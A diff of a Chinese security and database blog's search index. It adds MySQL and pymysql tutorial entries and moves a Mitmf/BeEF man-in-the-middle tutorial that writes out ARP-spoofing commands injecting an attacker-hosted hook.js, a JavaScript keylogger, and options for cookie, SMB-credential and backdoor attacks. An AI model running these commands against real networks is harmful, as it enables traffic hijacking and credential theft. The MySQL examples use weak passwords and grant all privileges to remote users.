@@ -89,6 +89,39 @@
     
     
     <entry>
+      <title>Python编程使用MySQL</title>
+      <link href="/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/"/>
+      <url>/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/</url>
+      
+        <content type="html"><![CDATA[<h4 id="Python数据库编程"><a href="#Python数据库编程" class="headerlink" title="Python数据库编程"></a><strong>Python数据库编程</strong></h4><ul><li>python数据库接口(Python DB-API)<ul><li>为开发人员提供的数据库应用编程接口</li><li>支持的数据库服务软件<ul><li>Mysql, Oracle, SQL_Server, Mongodb…</li></ul></li><li>python提供的操作mysql模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3: pymysql</span><br><span class="line">python2: MySQLdb</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="pymysql模块使用流程"><a href="#pymysql模块使用流程" class="headerlink" title="pymysql模块使用流程"></a><strong>pymysql模块使用流程</strong></h4><ol><li>建立数据库连接<ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul></li><li>创建游标对象</li><li>使用游标对象的方法操作数据库</li><li>提交commit</li><li>关闭游标对象</li><li>关闭数据库连接</li></ol><p><strong>示例</strong> <code>mysql_test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="comment">#1.创建数据库连接对象</span></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"><span class="comment">#2.创建游标对象</span></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"><span class="comment">#3.利用游标对象cursor的方法来操作数据库</span></span><br><span class="line">cursor.execute(<span class="string">"insert into userinfo values(1,200000,'sicuansheng');"</span>)</span><br><span class="line"><span class="comment">#4.提交到数据库commit</span></span><br><span class="line">db.commit()</span><br><span class="line"><span class="comment">#5. 关闭游标对象</span></span><br><span class="line">cursor.close()</span><br><span class="line"><span class="comment">#6.关闭数据库连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>建立数据库连接</strong></p><ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul><p><strong>SQL查询示例</strong> <code>inquiry.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"cat"</span>,<span class="string">"heybeauty"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"></span><br><span class="line">sql_select=<span class="string">"select * from userinfo;"</span></span><br><span class="line">cursor.execute(sql_select)</span><br><span class="line"></span><br><span class="line">data=cursor.fetchone()</span><br><span class="line">print(<span class="string">"fetchone的结果为"</span>,data)</span><br><span class="line"></span><br><span class="line">data2=cursor.fetchmany(<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"fetchmany(2)的结果为"</span>,data2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data2:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">data3=cursor.fetchall()</span><br><span class="line">print(<span class="string">"fetchall()的结果为"</span>,data3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data3:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">db.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>MySQL workbench</strong> </p><ul><li>官方图形化界面管理工具<ul><li><code>https://www.mysql.com/products/workbench/</code></li></ul></li></ul><p><strong>ER模型&amp;ER图</strong></p><ul><li>定义<ul><li>ER模型即 实体 - 关系 模型</li><li>ER图即 实体关系图</li></ul></li><li>三个概念<ul><li>实体</li><li>属性</li><li>关系<ul><li>定义: 实体之间的关系</li><li>分类<ul><li>一对一关系(1:1) # 班级和班长    </li><li>一对多关系(1:n) # 班级和学生</li><li>多对多关系(m:n) # 学生和课程</li></ul></li></ul></li><li>ER图的绘制<ul><li>矩形框代表实体,菱形框代表关系,椭圆形代表属性</li></ul></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> python </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> mysql </tag>
+            
+            <tag> pymysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Python内建的数值型函数及基本输入输出</title>
       <link href="/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/"/>
       <url>/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</url>
@@ -159,17 +192,17 @@
             
             <tag> 免杀 </tag>
             
-            <tag> backdoor-factory </tag>
-            
-            <tag> msfvenom </tag>
-            
             <tag> MSF </tag>
             
-            <tag> bdfproxy </tag>
+            <tag> msfvenom </tag>
             
             <tag> payload </tag>
             
             <tag> python </tag>
+            
+            <tag> backdoor-factory </tag>
+            
+            <tag> bdfproxy </tag>
             
             <tag> arpspoof </tag>
             
@@ -202,13 +235,13 @@
             
             <tag> msfvenom </tag>
             
+            <tag> Veil-Framework </tag>
+            
             <tag> payload </tag>
             
             <tag> python </tag>
             
             <tag> passing-the-hash </tag>
-            
-            <tag> Veil-Framework </tag>
             
             <tag> shellter </tag>
             
@@ -241,17 +274,17 @@
             
             <tag> 免杀 </tag>
             
-            <tag> msfvenom </tag>
-            
             <tag> MSF </tag>
             
-            <tag> payload </tag>
-            
-            <tag> python </tag>
+            <tag> msfvenom </tag>
             
             <tag> Veil-Framework </tag>
             
             <tag> Hyperion </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> python </tag>
             
             <tag> Veil-evasion </tag>
             
@@ -282,9 +315,9 @@
             
             <tag> 免杀 </tag>
             
-            <tag> msfvenom </tag>
-            
             <tag> MSF </tag>
+            
+            <tag> msfvenom </tag>
             
             <tag> Hyperion </tag>
             
@@ -1195,9 +1228,9 @@
       
         <tags>
             
-            <tag> wIDS </tag>
-            
             <tag> aircrack-ng </tag>
+            
+            <tag> wIDS </tag>
             
             <tag> wifite </tag>
             
@@ -1271,11 +1304,11 @@
             
             <tag> aircrack-ng </tag>
             
+            <tag> 无线密码破解 </tag>
+            
             <tag> WEP </tag>
             
             <tag> tmux </tag>
-            
-            <tag> 无线密码破解 </tag>
             
         </tags>
       
@@ -1306,13 +1339,13 @@
             
             <tag> aircrack-ng </tag>
             
-            <tag> 无线密码破解 </tag>
-            
             <tag> WPA </tag>
             
             <tag> john </tag>
             
             <tag> pyrit </tag>
+            
+            <tag> 无线密码破解 </tag>
             
             <tag> cowpatty </tag>
             
@@ -1611,9 +1644,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> VNC </tag>
-            
             <tag> SSH </tag>
+            
+            <tag> VNC </tag>
             
             <tag> proxychains </tag>
             
@@ -1646,9 +1679,9 @@
             
             <tag> 端口转发 </tag>
             
-            <tag> SSH </tag>
-            
             <tag> shell </tag>
+            
+            <tag> SSH </tag>
             
             <tag> 隧道 </tag>
             
@@ -1958,43 +1991,6 @@
     
     
     <entry>
-      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
-      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
-      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-          <category> 密码攻击 </category>
-          
-          <category> 嗅探欺骗 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> arpspoof </tag>
-            
-            <tag> dnsspoof </tag>
-            
-            <tag> Mitmf </tag>
-            
-            <tag> XSS </tag>
-            
-            <tag> beef </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Ettercap中间人攻击</title>
       <link href="/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
       <url>/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
@@ -2024,6 +2020,43 @@
             <tag> PTH </tag>
             
             <tag> 中间人攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
+      <link href="/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
+      <url>/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 密码攻击 </category>
+          
+          <category> 嗅探欺骗 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> arpspoof </tag>
+            
+            <tag> dnsspoof </tag>
+            
+            <tag> Mitmf </tag>
+            
+            <tag> XSS </tag>
+            
+            <tag> beef </tag>
             
         </tags>
       
@@ -2332,9 +2365,9 @@
       
         <tags>
             
-            <tag> 在线密码破解 </tag>
-            
             <tag> medusa </tag>
+            
+            <tag> 在线密码破解 </tag>
             
         </tags>
       
@@ -2396,9 +2429,9 @@
             
             <tag> Linux密码破解 </tag>
             
-            <tag> hydra </tag>
-            
             <tag> 在线密码破解 </tag>
+            
+            <tag> hydra </tag>
             
         </tags>
       
@@ -2714,9 +2747,9 @@
             
             <tag> XSS </tag>
             
-            <tag> 跨站脚本漏洞 </tag>
-            
             <tag> Xsser </tag>
+            
+            <tag> 跨站脚本漏洞 </tag>
             
         </tags>
       
@@ -2853,6 +2886,128 @@
     
     
     <entry>
+      <title>MySQL存储引擎及数据库调优</title>
+      <link href="/2014/05/10/MySQL/MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B0%83%E4%BC%98/"/>
+      <url>/2014/05/10/MySQL/MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B0%83%E4%BC%98/</url>
+      
+        <content type="html"><![CDATA[<h4 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a><strong>存储引擎</strong></h4><ul><li><p>定义</p><ul><li>是用来处理表的处理器</li></ul></li><li><p>存储引擎基本操作</p><ul><li>查看已有表的存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show create table 表名;# engine&#x3D;...</span><br></pre></td></tr></table></figure></li><li>创建表时指定存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(...)engine&#x3D;myisam;</span><br></pre></td></tr></table></figure></li><li>查看所有的存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engines;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>工作中使用的存储引擎</strong></p><ul><li><p>innodb 和 myisam</p><ul><li><p>innodb特点</p><ul><li>共享表空间  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表名.frm#存储表结构</span><br><span class="line">表名.ibd#存储表记录和索引信息</span><br></pre></td></tr></table></figure></li><li>支持行级锁</li></ul></li><li><p>myisam特点</p><ul><li>独享表空间  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表名.frm #存储表结构</span><br><span class="line">表名.myd#存储表记录</span><br><span class="line">表名.myi#存储索引信息</span><br></pre></td></tr></table></figure></li><li>支持表级锁</li></ul></li></ul></li><li><p>锁</p><ul><li>加锁的目的<ul><li>解决客户端并发访问的冲突问题</li></ul></li><li>锁类型<ul><li>读锁(select)共享锁<ul><li>加读锁之后不能更改表中内容,但可以进行查询</li></ul></li><li>写锁(insert,update,delete)互斥锁,排他锁</li></ul></li><li>锁粒度<ul><li>表级锁</li><li>行级锁</li></ul></li><li>操作完成后会自动释放锁</li></ul></li><li><p><strong>如何决定使用哪种存储引擎</strong></p><ul><li>执行查询操作多的表使用myisam存储引擎(使用innodb浪费资源)</li><li>执行写操作比较多的表使用innodb存储引擎</li></ul></li><li><p><strong>如何修改表的默认存储引擎</strong></p><ul><li>通过修改mysql配置文件更改默认存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;</span><br><span class="line"></span><br><span class="line">vi mysqld.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">defalut-storage-engini &#x3D; myisam</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart</span><br></pre></td></tr></table></figure></li></ul></li><li><p>memory存储引擎</p><ul><li>memory: 表记录存储在内存中  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表名.frm  存储表结构</span><br><span class="line"># 表记录存储在内存中</span><br><span class="line"># 服务重启之后表结构在,表记录都消失</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="MySQL调优"><a href="#MySQL调优" class="headerlink" title="MySQL调优"></a><strong>MySQL调优</strong></h4><ul><li><p>选择合适的存储引擎</p><ul><li>经常用来读的表使用myisam存储引擎</li><li>其余的表都用innodb存储引擎</li></ul></li><li><p>SQL语句调优(尽量避免全表扫描)</p><ul><li>在select where order by常涉及到的字段上建立索引</li><li>where子句中不使用 !=, 否则将放弃使用索引进行全表扫描</li><li>尽量避免用NULL值判断,否则会全表扫描</li><li>尽量避免 or 来连接条件,导致全表扫描</li><li>模糊查询尽量避免使用前置 % ,导致全表扫描</li><li>尽量避免 in 和 not in,导致全表扫描</li><li>尽量避免使用 select * …, 要用具体的字段列表代替 * , 不要返回用不到的任何字段</li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> memory </tag>
+            
+            <tag> innodb </tag>
+            
+            <tag> myisam </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL用户账户管理及数据备份还原</title>
+      <link href="/2014/05/10/MySQL/MySQL%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"/>
+      <url>/2014/05/10/MySQL/MySQL%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/</url>
+      
+        <content type="html"><![CDATA[<h4 id="MySQL用户账户管理"><a href="#MySQL用户账户管理" class="headerlink" title="MySQL用户账户管理"></a><strong>MySQL用户账户管理</strong></h4><ul><li><p><strong>开启MySQL远程连接</strong></p><ul><li>获取root权限<ul><li>sudo -i</li></ul></li><li>cd到配置文件所在路径<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;</span><br><span class="line">vi mysqld.cnf</span><br><span class="line">#bind-address &#x3D; 127.0.0.1</span><br></pre></td></tr></table></figure></li><li>重启mysql服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>添加授权用户</strong></p><ul><li>使用root用户连接到服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></table></figure></li><li>添加新的授权用户<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create user &quot;用户名&quot;@&quot;IP地址&quot; identified by &quot;密码&quot;;</span><br><span class="line">create user &quot;cat&quot;@&quot;%&quot; identified by &quot;123456&quot;;</span><br></pre></td></tr></table></figure></li><li>IP地址的表示方式:<ul><li>% 表示用户可以从任何地址连接到服务器</li><li>localhost 用户只能从本地连接</li><li>指定一个IP 表示用户只能从此IP连接到服务器<ul><li><strong>给用户授权</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant 权限列表 on 库.表 to &quot;用户名&quot;@&quot;IP地址&quot; with grant option;</span><br><span class="line">grant all privileges on *.* to &quot;cat&quot;@&quot;%&quot; with grant option;</span><br></pre></td></tr></table></figure></li></ul></li><li>权限列表:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select,update,delete,insert,alter,drop,create,...</span><br><span class="line">库.表: *.* 表示所有库的所有表</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>删除授权用户</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop user &quot;用户名&quot;@&quot;IP地址&quot;;</span><br><span class="line">drop user &quot;cat&quot;@&quot;%&quot;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据备份-mysqldump-在linux终端中操作"><a href="#数据备份-mysqldump-在linux终端中操作" class="headerlink" title="数据备份 (mysqldump,在linux终端中操作)"></a><strong>数据备份</strong> (mysqldump,在linux终端中操作)</h4><ul><li>命令格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span 